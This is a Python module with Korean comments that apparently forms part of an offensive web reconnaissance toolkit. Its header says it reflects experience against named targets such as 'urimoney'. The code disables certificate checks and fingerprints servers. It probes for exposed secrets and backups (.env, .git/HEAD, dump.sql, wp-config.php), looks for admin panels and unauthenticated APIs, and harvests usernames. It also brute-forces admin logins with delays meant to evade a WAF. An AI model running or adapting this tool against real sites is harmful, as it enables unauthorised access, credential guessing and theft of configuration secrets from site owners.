"""
HTTP Probe — 외부 도구 없이 순수 Python으로 타겟 탐사
urimoney, sunghwa, oknc 등 수십 개 타겟 실전 경험 반영
"""
from __future__ import annotations
import ssl
import re
import time
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
from dataclasses import dataclass, field
from typing import Any


# ── SSL 컨텍스트 (인증서 검증 비활성화) ──────────────────────────
_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE


@dataclass
class ProbeResult:
    url: str
    status: int
    body: str
    headers: dict
    elapsed: float
    error: str = ""

    @property
    def ok(self) -> bool:
        return self.status == 200

    def contains(self, *keywords: str) -> bool:
        body_lower = self.body.lower()
        return any(k.lower() in body_lower for k in keywords)

    def find_all(self, pattern: str) -> list[str]:
        return re.findall(pattern, self.body, re.I)


class HttpProbe:
    """세션 기반 HTTP 탐사 클라이언트"""

    def __init__(self, base_url: str = "", delay: float = 0.3):
        self.base_url = base_url.rstrip("/")
        self.delay = delay
        self._jar = http.cookiejar.CookieJar()
        self._opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=_CTX),
            urllib.request.HTTPCookieProcessor(self._jar),
        )
        self._last_req = 0.0

    def _throttle(self):
        wait = self.delay - (time.time() - self._last_req)
        if wait > 0:
            time.sleep(wait)
        self._last_req = time.time()

    def get(self, path: str, params: dict | None = None, headers: dict | None = None,
            timeout: int = 15) -> ProbeResult:
        self._throttle()
        url = path if path.startswith("http") else f"{self.base_url}{path}"
        if params:
            url += "?" + urllib.parse.urlencode(params)

        h = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "ko-KR,ko;q=0.9,en;q=0.8",
        }
        if headers:
            h.update(headers)

        rq = urllib.request.Request(url, headers=h)
        t0 = time.time()
        try:
            with self._opener.open(rq, timeout=timeout) as r:
                body = r.read().decode("utf-8", "replace")
                return ProbeResult(
                    url=url, status=r.status, body=body,
                    headers=dict(r.headers), elapsed=time.time()-t0,
                )
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace")
            return ProbeResult(url=url, status=e.code, body=body, headers={},
                               elapsed=time.time()-t0)
        except Exception as e:
            return ProbeResult(url=url, status=0, body="", headers={},
                               elapsed=time.time()-t0, error=str(e))

    def post(self, path: str, data: dict, headers: dict | None = None,
             timeout: int = 15) -> ProbeResult:
        self._throttle()
        url = path if path.startswith("http") else f"{self.base_url}{path}"
        h = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": self.base_url,
            "Referer": self.base_url + "/",
            "X-Requested-With": "XMLHttpRequest",
        }
        if headers:
            h.update(headers)
        body = urllib.parse.urlencode(data).encode()
        rq = urllib.request.Request(url, data=body, headers=h, method="POST")
        t0 = time.time()
        try:
            with self._opener.open(rq, timeout=timeout) as r:
                resp_body = r.read().decode("utf-8", "replace")
                return ProbeResult(url=url, status=r.status, body=resp_body,
                                   headers=dict(r.headers), elapsed=time.time()-t0)
        except urllib.error.HTTPError as e:
            resp_body = e.read().decode("utf-8", "replace")
            return ProbeResult(url=url, status=e.code, body=resp_body, headers={},
                               elapsed=time.time()-t0)
        except Exception as e:
            return ProbeResult(url=url, status=0, body="", headers={},
                               elapsed=time.time()-t0, error=str(e))

    # ── 정찰 헬퍼 ────────────────────────────────────────────────

    def fingerprint(self) -> dict:
        """서버 기술 스택 핑거프린팅"""
        r = self.get("/")
        result: dict[str, Any] = {
            "url": self.base_url,
            "status": r.status,
            "server": r.headers.get("Server", ""),
            "powered_by": r.headers.get("X-Powered-By", ""),
            "tech": [],
            "cms": "",
        }

        body = r.body.lower()
        # PHP 탐지
        if "php" in result["powered_by"].lower() or ".php" in body:
            result["tech"].append("PHP")
        # ASP.NET
        if "asp.net" in result["server"].lower() or ".aspx" in body or ".asp" in body:
            result["tech"].append("ASP.NET")
        # Nginx/Apache
        if "nginx" in result["server"].lower():
            result["tech"].append("Nginx")
        if "apache" in result["server"].lower():
            result["tech"].append("Apache")
        if "openresty" in result["server"].lower():
            result["tech"].append("OpenResty")
        if "iis" in result["server"].lower():
            result["tech"].append("IIS")
        # Gnuboard
        if "gnuboard" in body or "g5_path" in body:
            result["cms"] = "Gnuboard"
            result["tech"].append("Gnuboard")
        # WordPress
        if "wp-content" in body or "wp-includes" in body:
            result["cms"] = "WordPress"
            result["tech"].append("WordPress")
        # Session cookie
        for cookie in self._jar:
            if "phpsessid" in cookie.name.lower():
                result["tech"].append("PHP-Session")

        return result

    def scan_sensitive_files(self) -> list[dict]:
        """민감 파일 존재 여부 확인 (.env, phpinfo.php, test.php, install.php 등)"""
        TARGETS = [
            "/.env", "/.env.local", "/.env.production", "/.env.backup",
            "/phpinfo.php", "/php.php", "/info.php",
            "/test.php", "/dev.php", "/debug.php",
            "/install.php", "/setup.php", "/setup.html",
            "/.git/HEAD", "/.svn/entries",
            "/admin/", "/admin/login/", "/administrator/",
            "/robots.txt", "/sitemap.xml",
            "/backup.sql", "/db.sql", "/dump.sql",
            "/config.php", "/configuration.php", "/wp-config.php",
        ]
        found = []
        for path in TARGETS:
            r = self.get(path, timeout=8)
            if r.status == 200:
                found.append({"path": path, "status": 200, "size": len(r.body),
                               "preview": r.body[:100]})
            elif r.status == 406:
                # 406 = 파일 존재하지만 차단 (우리 경험!)
                found.append({"path": path, "status": 406,
                               "note": "File exists but blocked (WAF)"})
            elif r.status == 403:
                found.append({"path": path, "status": 403, "note": "Forbidden"})
            time.sleep(0.2)
        return found

    # ── Soft 404 키워드 (이 패턴 중 하나라도 매칭되면 False Positive 판정) ──
    _SOFT_404_PATTERNS = re.compile(
        r'(?:404|not\s*found|페이지를?\s*찾을\s*수\s*없|존재하지\s*않|'
        r'없는\s*페이지|잘못된\s*주소|页面不存在|找不到页面|该页面不存在|'
        r'page\s*not\s*found|no\s*such\s*page|this\s*page\s*doesn[\'"]?t\s*exist|'
        r'404\s*error|error\s*404|오류\s*페이지|에러\s*페이지)',
        re.IGNORECASE,
    )

    @classmethod
    def _is_soft_404(cls, body: str, path: str) -> bool:
        """소프트 404 판정 — 200이지만 실제 오류 페이지인 경우 True 반환.

        판정 기준:
          1. 응답 본문에 404/not-found 키워드 존재
          2. 본문이 500바이트 미만이고 <form> / <input> 없음 (빈 redirect 껍데기)
          3. 메인 페이지와 동일 제목 (커스텀 오류 페이지)
        """
        if cls._SOFT_404_PATTERNS.search(body):
            return True
        if len(body.strip()) < 500 and not re.search(r'<form|<input', body, re.I):
            return True
        return False

    def check_admin_panels(self, extra_paths: list[str] | None = None) -> list[dict]:
        """관리자 패널 탐색 — 동적 경로 지원 + 응답 유형 자동 분류

        response_type 필드:
          "json"       — 200 + JSON 응답 (API 데이터 노출 — High)
          "html_form"  — 200 + <form> 포함 (로그인 패널)
          "html"       — 200 + HTML (폼 없음, 실제 내용 존재)
          "redirect"   — 301/302
          "auth"       — 401/403 (존재하지만 인증 필요)

        v2.9.1 개선:
          Soft 404 감지 — 200 응답이지만 "페이지 없음" 내용인 경우 제외.
          이 경우 response_type = "soft_404" 로 표시 후 found 목록에서 제외.
        """
        paths = extra_paths if extra_paths else [
            "/admin/", "/admin/login/", "/admin/login/index.php",
            "/admin/index.php", "/admin.php", "/administrator/",
            "/manager/", "/manage/", "/panel/",
            "/wp-admin/", "/wp-login.php",
            "/login.php", "/member/login.php",
        ]
        found = []
        for path in paths:
            r = self.get(path, timeout=8)
            if r.status in (200, 201):
                # ── Soft 404 필터 (v2.9.1) ─────────────────────────────
                if self._is_soft_404(r.body, path):
                    # False Positive — 실제 내용 없는 200 응답, 수집하지 않음
                    time.sleep(0.1)
                    continue

                # ── 응답 유형 판별 ──────────────────────────────────────
                ct = r.headers.get("Content-Type", "")
                body_stripped = r.body.lstrip()
                is_json = (
                    "application/json" in ct
                    or body_stripped.startswith(("{", "["))
                )
                has_form = bool(re.search(r'<form|<input[^>]*type=["\']password', r.body, re.I))
                title_m = re.search(r'<title>([^<]{1,80})</title>', r.body, re.I)

                if is_json:
                    rtype = "json"
                elif has_form:
                    rtype = "html_form"
                else:
                    rtype = "html"

                found.append({
                    "path": path,
                    "status": r.status,
                    "response_type": rtype,
                    "is_json": is_json,
                    "has_login_form": has_form,
                    "title": title_m.group(1).strip() if title_m else "",
                    "url": self.base_url + path,
                    "size": len(r.body),
                    "preview": r.body[:200] if is_json else "",
                })
            elif r.status in (301, 302):
                found.append({
                    "path": path,
                    "status": r.status,
                    "response_type": "redirect",
                    "is_json": False,
                    "has_login_form": False,
                    "title": "",
                    "url": self.base_url + path,
                    "size": 0,
                    "preview": "",
                })
            elif r.status in (401, 403):
                found.append({
                    "path": path,
                    "status": r.status,
                    "response_type": "auth",
                    "is_json": False,
                    "has_login_form": False,
                    "title": "",
                    "url": self.base_url + path,
                    "size": 0,
                    "preview": "",
                    "note": "Forbidden / Unauthorized — exists but blocked",
                })
            time.sleep(0.15)
        return found

    def discover_api_endpoints(self, paths: list[str] | None = None) -> list[dict]:
        """API 엔드포인트 미인증 접근 탐색

        status 기준:
          200/201 → 미인증 접근 성공 (High)
          401/403 → 존재하지만 인증 필요 (Info)
          502/503/504 → 리버스 프록시 뒤에 서비스 존재 가능성 (Medium)
        """
        from .path_dict import get_api_paths
        target_paths = paths if paths else get_api_paths()
        found = []
        for path in target_paths:
            r = self.get(path, timeout=8)
            if r.status in (200, 201):
                is_json = (
                    "application/json" in r.headers.get("Content-Type", "")
                    or r.body.lstrip().startswith(("{", "["))
                )
                found.append({
                    "path": path,
                    "status": r.status,
                    "size": len(r.body),
                    "is_json": is_json,
                    "preview": r.body[:200],
                    "url": self.base_url + path,
                    "note": "Unauthenticated access",
                })
            elif r.status in (401, 403):
                # 존재하지만 인증 필요
                found.append({
                    "path": path,
                    "status": r.status,
                    "size": 0,
                    "is_json": False,
                    "preview": "",
                    "url": self.base_url + path,
                    "note": "Exists but requires auth",
                })
            elif r.status in (502, 503, 504):
                # Bad Gateway / Service Unavailable — 리버스 프록시 뒤에 서비스 존재
                # 서비스가 일시 다운이거나 백엔드가 해당 경로를 갖고 있음
                found.append({
                    "path": path,
                    "status": r.status,
                    "size": 0,
                    "is_json": False,
                    "preview": "",
                    "url": self.base_url + path,
                    "note": f"Proxy error {r.status} — backend service may exist",
                })
            time.sleep(0.1)
        return found

    def harvest_usernames(self) -> list[str]:
        """사이트에서 잠재적 사용자명 자동 수집

        수집 방법:
          1. 페이지 내 이메일 주소 (@앞부분 추출)
          2. WordPress /?author=1~5 리다이렉트에서 author slug 추출
          3. meta author 태그
          4. Contact/About/Team 페이지 이메일
          5. HTML input placeholder/value 힌트
        """
        usernames: set[str] = set()

        # 1. 메인 페이지 이메일
        r_home = self.get("/", timeout=10)
        if r_home.status == 200:
            emails = re.findall(r'[\w.+\-]+@[\w.\-]+\.\w{2,6}', r_home.body)
            for email in emails[:15]:
                local = email.split("@")[0].lower()
                # 필터: 너무 짧거나 no-reply 제외
                if len(local) >= 3 and "noreply" not in local and "no-reply" not in local:
                    usernames.add(local)

            # meta author
            m = re.search(r'<meta[^>]+name=["\']author["\'][^>]+content=["\']([^"\']+)["\']',
                          r_home.body, re.I)
            if m:
                author = m.group(1).strip().lower().replace(" ", "")
                if author:
                    usernames.add(author)

        # 2. WordPress author 스캔 (?author=N → /author/username/ 리다이렉트)
        for i in range(1, 6):
            r = self.get(f"/?author={i}", timeout=8)
            loc = r.headers.get("Location", "")
            if r.status in (301, 302) and "/author/" in loc:
                m2 = re.search(r'/author/([^/?#]+)', loc)
                if m2:
                    usernames.add(m2.group(1).lower())

        # 3. Contact / About / Team 페이지
        for path in ["/contact", "/about", "/about-us", "/team", "/staff",
                     "/contact-us", "/company"]:
            r = self.get(path, timeout=8)
            if r.status == 200:
                emails2 = re.findall(r'[\w.+\-]+@[\w.\-]+\.\w{2,6}', r.body)
                for email in emails2[:5]:
                    local = email.split("@")[0].lower()
                    if len(local) >= 3:
                        usernames.add(local)

        # 4. login form placeholder 힌트 (예: placeholder="아이디" value="admin")
        login_paths = ["/login", "/login/", "/admin/login", "/member/login.php"]
        for lp in login_paths:
            r = self.get(lp, timeout=8)
            if r.status == 200:
                placeholders = re.findall(
                    r'<input[^>]+type=["\']text["\'][^>]+value=["\']([^"\']{3,20})["\']',
                    r.body, re.I
                )
                for ph in placeholders[:3]:
                    if ph.lower() not in ("username", "email", "id", "아이디"):
                        usernames.add(ph.lower())

        return list(usernames)

    def brute_admin_login(
        self,
        login_url: str,
        credentials: list[tuple[str, str]],
        user_field: str = "username",
        pass_field: str = "password",
        max_attempts: int = 20,
    ) -> list[dict]:
        """약한 비밀번호 브루트포스 (속도 제한 포함)"""
        successes = []
        for i, (user, pwd) in enumerate(credentials[:max_attempts]):
            r = self.post(
                login_url,
                {user_field: user, pass_field: pwd},
                timeout=10,
            )
            body_lower = r.body.lower()
            # 성공 판단: 리다이렉트 or 성공 키워드 포함
            is_success = (
                r.status in (302, 301)
                or any(kw in body_lower for kw in [
                    "dashboard", "logout", "welcome",
                    "대시보드", "로그아웃", "환영", "성공",
                ])
            ) and not any(kw in body_lower for kw in [
                "invalid", "incorrect", "error", "fail",
                "wrong", "denied", "unauthorized",
                "아이디", "비밀번호가 틀", "로그인 실패", "오류",
            ])
            if is_success:
                successes.append({
                    "url": login_url,
                    "username": user,
                    "password": pwd,
                    "status": r.status,
                    "evidence": r.body[:200],
                })
            # 속도 제한 — WAF 트리거 방지
            time.sleep(0.5 if i < 5 else 1.0)
        return successes
